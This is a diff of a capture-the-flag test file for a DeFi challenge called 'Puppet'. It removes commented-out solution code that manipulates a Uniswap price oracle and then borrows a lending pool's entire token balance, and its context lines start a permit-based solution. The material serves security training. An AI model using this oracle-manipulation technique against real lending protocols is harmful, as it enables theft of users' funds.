@@ -95,25 +95,6 @@ describe('[Challenge] Puppet', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
-        // await token.connect(player).approve(
-        //     uniswapExchange.address,
-        //     PLAYER_INITIAL_TOKEN_BALANCE
-        // );
-        // await uniswapExchange.connect(player).tokenToEthSwapOutput(
-        //     UNISWAP_INITIAL_ETH_RESERVE - (1n * 10n ** 17n),
-        //     PLAYER_INITIAL_TOKEN_BALANCE,
-        //     (await ethers.provider.getBlock('latest')).timestamp * 2,
-        //     { gasLimit: 1e6 }
-        // );
-
-        // await token.connect(player).transfer(uniswapExchange.address, await token.balanceOf(player.address));
-
-        // expect(
-        //     await lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE)
-        // ).to.be.lt(await ethers.provider.getBalance(player.address));
-
-        // await lendingPool.connect(player).borrow(POOL_INITIAL_TOKEN_BALANCE, player.address, {value: PLAYER_INITIAL_ETH_BALANCE});
-        
         const deadline = Math.floor(Date.now() / 1000) + 4200;
         const nonces = await token.nonces(player.address);
       
